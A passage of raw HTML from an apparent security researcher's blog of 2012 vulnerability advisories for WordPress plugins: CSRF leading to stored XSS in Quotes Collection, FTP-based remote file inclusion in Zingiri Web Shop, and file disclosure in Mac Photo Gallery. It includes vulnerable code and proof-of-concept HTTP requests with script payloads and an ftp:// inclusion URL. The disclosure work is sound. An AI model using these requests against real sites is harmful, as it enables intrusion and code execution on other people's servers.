class="crayon-sy">$</span><span class="crayon-v">author</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">author</span><span class="crayon-sy">?</span><span class="crayon-s">"'"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">escape</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">author</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"'"</span><span class="crayon-o">:</span><span class="crayon-s">"NULL"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">source</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">source</span><span class="crayon-sy">?</span><span class="crayon-s">"'"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">escape</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">source</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"'"</span><span class="crayon-o">:</span><span class="crayon-s">"NULL"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tags</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">','</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">tags</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">tags </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">key</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">tag</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tags</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">trim</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">tag</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tags</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">implode</span><span class="crayon-sy">(</span><span class="crayon-s">','</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">tags</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tags</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">tags</span><span class="crayon-sy">?</span><span class="crayon-s">"'"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">escape</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">tags</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"'"</span><span class="crayon-o">:</span><span class="crayon-s">"NULL"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-m">public</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"'no'"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"'yes'"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">insert</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"INSERT INTO "</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">table_name</span><span class="crayon-h"> </span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"(quote, author, source, tags, public, time_added)"</span><span class="crayon-h"> </span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"VALUES ({$quote}, {$author}, {$source}, {$tags}, {$public}, NOW())"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">results</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">insert</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-t">FALSE</span><span class="crayon-h"> </span><span class="crayon-o">===</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">results</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">__</span><span class="crayon-sy">(</span><span class="crayon-s">'There was an error in the MySQL query'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'quotes-collection'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">__</span><span class="crayon-sy">(</span><span class="crayon-s">'Quote added'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'quotes-collection'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-34"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-35"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0138 seconds] -->
<p>If we either make this request directly, simulating a CSRF attack, or actually create a malicious page and convince an admin on a WordPress blog with this plugin to click on your link, we can cause a persistent XSS due to the lack of a nonce and sanitizing of html input.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f29569861753016" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-admin/admin.php?page=quotes-collection&amp;submit=AddQuote&amp;public=on&amp;tags=x&amp;source=&lt;script&gt;alert(1)&lt;/script&gt;&amp;author=&lt;script&gt;alert(2)&lt;/script&gt;&amp;quote=&lt;script&gt;alert(3)&lt;/script&gt; HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f29569861753016-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29569861753016-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f29569861753016-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">admin</span><span class="crayon-o">/</span><span class="crayon-v">admin</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">page</span><span class="crayon-o">=</span><span class="crayon-i">quotes</span><span class="crayon-o">-</span><span class="crayon-i">collection</span><span class="crayon-o">&amp;</span><span class="crayon-v">submit</span><span class="crayon-o">=</span><span class="crayon-i">AddQuote</span><span class="crayon-o">&amp;</span><span class="crayon-m">public</span><span class="crayon-o">=</span><span class="crayon-i">on</span><span class="crayon-o">&amp;</span><span class="crayon-v">tags</span><span class="crayon-o">=</span><span class="crayon-i">x</span><span class="crayon-o">&amp;</span><span class="crayon-v">source</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-ta">&lt;/script&gt;</span><span class="crayon-o">&amp;</span><span class="crayon-v">author</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-ta">&lt;/script&gt;</span><span class="crayon-o">&amp;</span><span class="crayon-v">quote</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-cn">3</span><span class="crayon-sy">)</span><span class="crayon-ta">&lt;/script&gt;</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29569861753016-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0031 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/quotes-collection/" rel="tag">Quotes Collection</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/03/wordpress-quotes-collection-plugin-cross-site-request-forgery-vulnerability/#respond" title="Comment on WordPress Quotes Collection plugin cross-site request forgery vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-34 -->

				
					
<article id="post-22" class="post-22 post type-post status-publish format-standard hentry category-advisories tag-wordpress-plugin tag-zingiri-web-shop">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/02/wordpress-zingiri-shop-plugin-abspath-remote-file-inclusion-vulnerability/" title="6:23 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-02T18:23:28+00:00" pubdate>July 2, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/02/wordpress-zingiri-shop-plugin-abspath-remote-file-inclusion-vulnerability/" title="Permalink to WordPress Zingiri Shop plugin &#8220;abspath&#8221; remote file inclusion vulnerability" rel="bookmark">WordPress Zingiri Shop plugin &#8220;abspath&#8221; remote file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49676/">Secunia Advisory SA 49676</a></p>
<p><strong>Analysis</strong><br />
I had been looking at this particular piece of code for a while. At a glance, while the handling of the looks somewhat safe due to the validation that the input path is in fact a directory, so at best you could sort of chain an exploit with this. The question is, how could you take this to a RFI? Lets look at <a href="http://plugins.svn.wordpress.org/zingiri-web-shop/tags/2.4.6/fws/download.php">/fws/download.php</a>:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2997b583116700" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if (isset($_POST['abspath'])) $abspath=$_POST['abspath']; else $abspath=$_GET['abspath'];
if (!is_dir($abspath)) die('Error downloading');
require($abspath.'wp-blog-header.php');</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2997b583116700-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2997b583116700-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2997b583116700-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2997b583116700-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'abspath'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">abspath</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'abspath'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">abspath</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'abspath'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2997b583116700-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">is_dir</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">abspath</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">'Error downloading'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2997b583116700-3"><span class="crayon-e">require</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">abspath</span><span class="crayon-sy">.</span><span class="crayon-s">'wp-blog-header.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0023 seconds] -->
<p>As you see, this may very well look safe at a glance. For us to be able to exploit the fact that the &#8216;abspath&#8217; variable is user controlled, we need to get a true back from is_dir. I checked with google how to pull this off when providing a remote host. This isn&#8217;t possible with HTTP, and nobody suggested an alternative. For this to work, the protocol wrapper needs to support the &#8220;stat()&#8221; family of functions. HTTP isn&#8217;t one of these. But as it turns out, <a href="http://www.php.net/manual/en/wrappers.ftp.php">FTP</a> is. Bingo! We now have a piece of code that through a very specific detail in the PHP implementation, that we can exploit.</p>
<p>By putting up a FTP server with some specified credentials, and a file called wp-blog-header.php with some malicious PHP, we can include an URL in the abspath GET parameter, which will exploit this vulnerability:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f29987462665502" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-content/plugins/zingiri-web-shop/fws/download.php?abspath=ftp://dog:hello@localhost/ HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f29987462665502-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29987462665502-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f29987462665502-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">zingiri</span><span class="crayon-o">-</span><span class="crayon-i">web</span><span class="crayon-o">-</span><span class="crayon-i">shop</span><span class="crayon-o">/</span><span class="crayon-i">fws</span><span class="crayon-o">/</span><span class="crayon-v">download</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">abspath</span><span class="crayon-o">=</span><span class="crayon-i">ftp</span><span class="crayon-o">:</span><span class="crayon-c">//dog:hello@localhost/ HTTP/1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29987462665502-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="https://charlieeriksen.github.io/tag/zingiri-web-shop/" rel="tag">Zingiri Web Shop</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/02/wordpress-zingiri-shop-plugin-abspath-remote-file-inclusion-vulnerability/#respond" title="Comment on WordPress Zingiri Shop plugin &#8220;abspath&#8221; remote file inclusion vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-22 -->

				
					
<article id="post-18" class="post-18 post type-post status-publish format-standard hentry category-advisories tag-mac-photo-gallery tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/06/21/wordpress-mac-photo-gallery-plugin-albid-arbitrary-file-disclosure-vulnerability/" title="7:22 pm" rel="bookmark" class="entry-date"><time datetime="2012-06-21T19:22:06+00:00" pubdate>June 21, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/06/21/wordpress-mac-photo-gallery-plugin-albid-arbitrary-file-disclosure-vulnerability/" title="Permalink to WordPress Mac Photo Gallery plugin &#8220;albid&#8221; arbitrary file disclosure vulnerability" rel="bookmark">WordPress Mac Photo Gallery plugin &#8220;albid&#8221; arbitrary file disclosure vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49650/">Secunia Advisory SA 49650</a></p>
<p><strong>Analysis<br />
</strong>This vulnerability relies on a lack of validation of the &#8220;albid&#8221; in <a href="http://plugins.svn.wordpress.org/mac-dock-gallery/tags/2.9/macdownload.php">macdownload.php</a>, which is passed straight into the path that is read at line 37 into the response. This cases an arbitrary file disclosure vulnerability.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f29e39758971765" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require_once( dirname(__FILE__) . '/macDirectory.php');

$folder = dirname(plugin_basename(__FILE__));
$file = dirname(dirname(dirname(__FILE__)))."/uploads/mac-dock-gallery/".$_GET['albid'];

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    ob_clean();
    flush();
    readfile($file);
?&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f29e39758971765-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29e39758971765-2">2</div><div class="crayon-num" data-line="crayon-53c9878f29e39758971765-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29e39758971765-4">4</div><div class="crayon-num" data-line="crayon-53c9878f29e39758971765-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29e39758971765-6">6</div><div class="crayon-num" data-line="crayon-53c9878f29e39758971765-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29e39758971765-8">8</div><div class="crayon-num" data-line="crayon-53c9878f29e39758971765-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29e39758971765-10">10</div><div class="crayon-num" data-line="crayon-53c9878f29e39758971765-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29e39758971765-12">12</div><div 